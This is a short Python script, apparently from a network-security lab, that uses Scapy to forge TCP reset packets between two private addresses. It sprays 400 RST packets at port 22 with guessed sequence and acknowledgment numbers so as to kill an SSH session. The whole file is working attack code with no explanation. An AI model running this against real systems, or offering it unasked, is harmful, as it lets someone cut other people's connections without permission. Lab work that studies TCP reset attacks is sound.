from scapy.all import *
ip = IP(src="10.0.2.5", dst="10.0.2.6")
seq_n=90231643
ack_n=1915125003
for i in range (20):
    for j in range (20):
        tcp = TCP(sport=47234, dport=22, flags="R", seq=seq_n+i, ack=ack_n+j)
        pkt = ip/tcp
        send(pkt,verbose=0)
